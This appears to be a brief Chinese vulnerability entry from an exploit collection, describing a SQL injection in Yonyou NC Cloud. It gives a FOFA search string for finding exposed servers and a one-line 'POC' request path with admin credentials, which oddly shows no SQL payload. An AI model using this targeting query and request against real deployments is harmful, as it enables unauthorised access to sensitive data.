## 用友NC Cloud Sql注入漏洞

## 漏洞描述

攻击者构造恶意SQL语句未授权获取后台敏感数据。

## 漏洞影响

> NC Cloud

## FOFA

> "NCCloud"

## POC

```
/fs/console?username=admin&password=123456
```

![1](/resource/用友NC-Cloud-Sql注入/1.png)

![2](/resource/用友NC-Cloud-Sql注入/2.png)